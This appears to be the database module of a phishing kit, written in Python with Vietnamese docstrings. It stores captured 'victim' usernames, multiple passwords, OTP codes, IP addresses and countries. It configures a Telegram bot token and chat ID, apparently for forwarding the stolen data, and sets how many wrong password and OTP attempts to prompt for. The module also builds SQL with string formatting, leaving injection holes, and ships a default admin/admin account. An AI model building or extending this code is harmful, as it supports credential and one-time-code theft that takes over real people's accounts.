"""
Module để xử lý các tương tác với cơ sở dữ liệu SQLite
---
- Class:
    - Account: Xem và sửa tài khoản admin
    - Config: Thiết lập cấu hình như Token API và Chat ID, bao gồm khởi tạo, truy xuất và cập nhật thông tin cấu hình.
    - Data: Quản lí data, bao gồm xem, thêm và xóa data
"""

import sqlite3


def connect_db():
    """
    Kết nối đến SQLite
    ---
    Trả về:
        sqlite3.Connection: Đối tượng kết nối đến cơ sở dữ liệu SQLite.
    """
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row
    return conn


def close_db(conn):
    """
    Đóng kết nối với cơ sở dữ liệu SQLite.

    Tham số:
        conn (sqlite3.Connection): Đối tượng kết nối đến cơ sở dữ liệu SQLite.
    """
    conn.close()


class Account:
    """
    Khởi tạo đối tượng Account
    ---
    - Tham số:
        - username (str): Tên người dùng của tài khoản.

        - password (str): Mật khẩu của tài khoản.
    ---
    - Method:

        >>> - get_info: Truy xuất thông tin tài khoản
                - Trả về: {'username': 'abcxyz', 'password': 'abcxyz'}
        >>> - change_info(username: str, password: str): Đổi thông tin tài khoản
            - Tham số:
                - username (str): Tên người dùng mới của tài khoản.
                - password (str): Mật khẩu mới của tài khoản.
    """

    def __init__(self, username='admin', password='admin'):
        self.conn = connect_db()
        self.username = username
        self.password = password
        self.init_db(self.username, self.password)

    def init_db(self, username, password):
        script = f"""--sql
            CREATE TABLE IF NOT EXISTS
                Account (
                    username TEXT NOT NULL PRIMARY KEY UNIQUE,
                    password TEXT NOT NULL
                );
            BEGIN TRANSACTION;

            INSERT INTO
                Account (username, password)
            SELECT
                '{username}', '{password}'
            WHERE NOT EXISTS (
                    SELECT
                        1
                    FROM
                        Account
                );
            COMMIT;
            """
        self.conn.cursor().executescript(script)
        self.conn.commit()

    def get_info(self):
        """
        Truy xuất thông tin tài khoản.
        ---
        - Trả về:

            >>> {'username': 'abcxyz', 'password': 'abcxyz'}
        """

        data = {
            'username': '',
            'password': ''
        }
        cursor = self.conn.cursor()
        script = """--sql
            SELECT * FROM Account;
            """
        cursor.execute(script)
        result = cursor.fetchall()
        for row in result:
            data['username'] = row['username']
            data['password'] = row['password']
        return data

    def change_info(self, username: str, password: str):
        """
        Đổi thông tin tài khoản
        ---
        >>> - Tham số:
                - username (str): Tên người dùng mới của tài khoản.
                - password (str): Mật khẩu mới của tài khoản.
        """
        script = f"""--sql
            UPDATE Account
            SET username = '{username}', password = '{password}';
            """
        self.conn.cursor().executescript(script)
        self.conn.commit()


class Config:
    """
    Khởi tạo đối tượng Config
    ---
    - Method:

        >>> - get_info: Truy xuất các thiết lập cấu hình.
                - Trả về: {'api_token': '1231', 'chat_id': '123', 'incorrect_password_attempts': '1', 'incorrect_otp_attempts': '2', 'delay_time': '3'}

        >>> - change_info(api_token: str, chat_id: str, incorrect_password_attempts: int, incorrect_otp_attempts: int, delay_time: int): Cấu hình web và Telegram
                - Tham số:
                    - api_token (str): API Token của Telegram
                    - chat_id (str): ChatID Telegram.
                    - incorrect_password_attempts (int): Số lần tối đa nhập sai mật khẩu
                    - incorrect_otp_attempts (int): Số lần tối đa nhập sai mã OTP
                    - delay_time (int): Thời gian delay mỗi lần nhập sai(Giây)
    """

    def __init__(self) -> None:
        self.conn = connect_db()
        self.init_db()

    def init_db(self):
        script = """--sql
        CREATE TABLE IF NOT EXISTS
            Config (
                api_token TEXT NOT NULL,
                chat_id TEXT NOT NULL,
                incorrect_password_attempts INT NOT NULL,
                incorrect_otp_attempts INT NOT NULL,
                delay_time INT NOT NULL
            );
            """
        self.conn.cursor().executescript(script)
        self.conn.commit()

    def get_info(self):
        """
        Truy xuất các thiết lập cấu hình.
        ---
        - Trả về:

            >>> {'api_token': '1231', 'chat_id': '123', 'incorrect_password_attempts': '1', 'incorrect_otp_attempts': '2', 'delay_time': '3'}
        """
        data = {
            "api_token": '',
            "chat_id": '',
            "incorrect_password_attempts": '',
            "incorrect_otp_attempts": '',
            "delay_time": ''
        }
        cursor = self.conn.cursor()
        script = """--sql
            SELECT * FROM Config;
            """
        cursor.execute(script)
        result = cursor.fetchall()
        for row in result:
            data['api_token'] = row['api_token']
            data['chat_id'] = row['chat_id']
            data['incorrect_password_attempts'] = row['incorrect_password_attempts']
            data['incorrect_otp_attempts'] = row['incorrect_otp_attempts']
            data['delay_time'] = row['delay_time']
        return data

    def change_info(self, api_token: str, chat_id: str, incorrect_password_attempts: int, incorrect_otp_attempts: int, delay_time: int):
        """
        Cập nhật các thiết lập cấu hình.
        ---
        >>> - Tham số:
            - api_token (str): Token_API mới.
            - chat_id (str): Chat_ID mới.
            - incorrect_password_attempts (int): Số lần tối đa nhập sai mật khẩu
            - incorrect_otp_attempts (int): Số lần tối đa nhập sai mã OTP
            - delay_time (int): Thời gian delay mỗi lần nhập sai(Giây)
        """
        script = f"""--sql
                BEGIN TRANSACTION;
                INSERT INTO
                    Config (api_token, chat_id, incorrect_password_attempts,
                            incorrect_otp_attempts, delay_time)
                SELECT
                    '{api_token}', '{chat_id}', '{incorrect_password_attempts}', '{incorrect_otp_attempts}', '{delay_time}'
                WHERE NOT EXISTS (
                    SELECT
                        1
                    FROM
                        Config
                );
                COMMIT;
                UPDATE Config
                SET api_token = '{api_token}', chat_id = '{chat_id}', incorrect_password_attempts = '{incorrect_password_attempts}', incorrect_otp_attempts = '{incorrect_otp_attempts}', delay_time = '{delay_time}';
                """
        self.conn.cursor().executescript(script)
        self.conn.commit()


class Data:
    """
    Khởi tạo đối tượng Data
    ---
    - Method:

        >>> - get_info:
            {1: {'username': 'adu', 'password': "{'password0': 0, 'password1': 1}", 'code': '123', 'ip': '192.168.1.1', 'country': 'vietnam'}, 2: {
                'username': 'adu', 'password': "{'password0': 0, 'password1': 1}", 'code': '123', 'ip': '192.168.1.1', 'country': 'vietnam'}}

        >>> - add_data(username: str, password: str, code: str, ip: str, country: str): Thêm một mục dữ liệu mới vào cơ sở dữ liệu.
            - Tham số:
                - username (str): Tài khoản hoặc mật khẩu của victim
                - password (str): Danh sách dạng JSON chứa các mật khẩu với định dạng {'password_0': 'adu', 'password_1': 'vip'...}
                - code (str): Danh sách dạng JSON chứa các mật khẩu với định dạng {'code_0': 'adu', 'code_1': 'vip'...}
                - ip (str): Địa chỉ IP Victim
                - country (str): Quốc gia victim
        >>> - delete_data(id): Xóa một mục dữ liệu khỏi cơ sở dữ liệu theo ID.
                - Tham số:
                    - id (int): ID của mục dữ liệu cần xóa.
    """

    def __init__(self) -> None:
        self.conn = connect_db()
        self.init_db()

    def init_db(self):
        script = """--sql
            CREATE TABLE IF NOT EXISTS
                    Data (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        username TEXT NOT NULL,
                        password TEXT NOT NULL,
                        code TEXT,
                        ip TEXT,
                        country TEXT
                    );
            """
        self.conn.cursor().executescript(script)
        self.conn.commit()

    def get_data(self):
        """
        Truy xuất tất cả các mục dữ liệu từ cơ sở dữ liệu.
        ---
        >>> - Trả về:
            {1: {'username': 'adu', 'password': "{'password0': 0, 'password1': 1}", 'code': '123', 'ip': '192.168.1.1', 'country': 'vietnam'}, 2: {
                'username': 'adu', 'password': "{'password0': 0, 'password1': 1}", 'code': '123', 'ip': '192.168.1.1', 'country': 'vietnam'}}
        """
        data = {}
        cursor = self.conn.cursor()
        script = """--sql
            SELECT * FROM Data;
            """
        cursor.execute(script)
        result = cursor.fetchall()
        for row in result:
            data[row['id']] = {
                'username': row['username'],
                'password': row['password'],
                'code': row['code'],
                'ip': row['ip'],
                'country': row['country'],
            }
        return data

    def add_data(self, username: str, password: str, code: str, ip: str, country: str):
        """
        Thêm một mục dữ liệu mới vào cơ sở dữ liệu.
        ---
        >>> - Tham số:
                - username (str): Tài khoản hoặc mật khẩu của victim
                - password (str): Danh sách dạng JSON chứa các mật khẩu với định dạng {'password_0': 'adu', 'password_1': 'vip'...}
                - code (str): Danh sách dạng JSON chứa các mật khẩu với định dạng {'code_0': 'adu', 'code_1': 'vip'...}
                - ip (str): Địa chỉ IP Victim
                - country (str): Quốc gia victim
        """

        script = """--sql
            INSERT INTO Data
                (username, password, code, ip, country)
            VALUES
                (?, ?, ?, ?, ?);
            """
        self.conn.cursor().execute(script, (username, password, code, ip, country))
        self.conn.commit()
        self.conn.commit()

    def delete_data(self, id: int):
        """
        Xóa một mục dữ liệu khỏi cơ sở dữ liệu theo ID.
        ---
        Tham số:
            id (int): ID của mục dữ liệu cần xóa.
        """
        script = """--sql
            DELETE FROM Data
            WHERE id = ?;
            """
        self.conn.cursor().execute(script, (id,))
        self.conn.commit()
